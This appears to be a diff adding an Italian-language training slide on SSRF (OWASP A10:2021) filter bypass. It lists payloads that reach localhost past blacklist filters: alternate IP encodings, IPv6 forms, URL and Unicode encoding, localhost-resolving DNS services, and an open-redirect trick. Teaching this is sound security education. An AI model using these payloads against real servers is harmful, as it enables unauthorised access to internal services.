@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>OWASP A10:2021 - Esercizio 4: Bypass Filtri</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">🔓 Esercizio 4: Bypass dei Filtri</h1>
+        <div class="subtitle">I filtri blacklist sono quasi sempre bypassabili</div>
+
+        <div class="grid-2-col">
+            <div class="card border-red">
+                <div class="card-title">🔢 Encoding IP</div>
+                <div class="card-text">
+                    <span class="tech-term">127.0.0.1</span> può essere scritto in molti modi:
+                    <div class="code-box"># Decimal (intero)
+http://2130706433
+
+# Hexadecimal
+http://0x7f000001
+
+# Octal
+http://0177.0.0.1
+
+# Mixed
+http://127.0.0.0x1
+
+# Shortened
+http://127.1</div>
+                </div>
+            </div>
+
+            <div class="card border-blue">
+                <div class="card-title">🌐 IPv6</div>
+                <div class="card-text">
+                    Molti filtri controllano solo IPv4:
+                    <div class="code-box"># IPv6 localhost
+http://[::1]
+
+# IPv6 expanded
+http://[0:0:0:0:0:0:0:1]
+
+# IPv6 mapped IPv4
+http://[::ffff:127.0.0.1]
+
+# IPv6 con porta
+http://[::1]:80</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid-2-col" style="margin-top: 25px;">
+            <div class="card border-purple">
+                <div class="card-title">🔄 URL Encoding</div>
+                <div class="card-text">
+                    <div class="code-box"># URL encoding
+http://127.0.0.%31
+
+# Double encoding
+http://127.0.0.%2531
+
+# Unicode
+http://127。0。0。1</div>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">🌍 DNS Rebinding</div>
+                <div class="card-text">
+                    Domini che risolvono a localhost:
+                    <div class="code-box"># Servizi DNS speciali
+http://localtest.me
+http://127.0.0.1.nip.io
+http://spoofed.burpcollaborator.net
+
+# Il tuo dominio con A record 127.0.0.1</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-yellow" style="margin-top: 20px;">
+            <div class="card-title">⚠️ Redirect Bypass</div>
+            <div class="card-text">
+                Se il filtro controlla solo l'URL iniziale, usa un <strong>redirect</strong>:
+                <span class="tech-term">http://tuoserver.com/redirect?url=http://127.0.0.1</span>
+                Il server segue il redirect e raggiunge localhost!
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 6;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
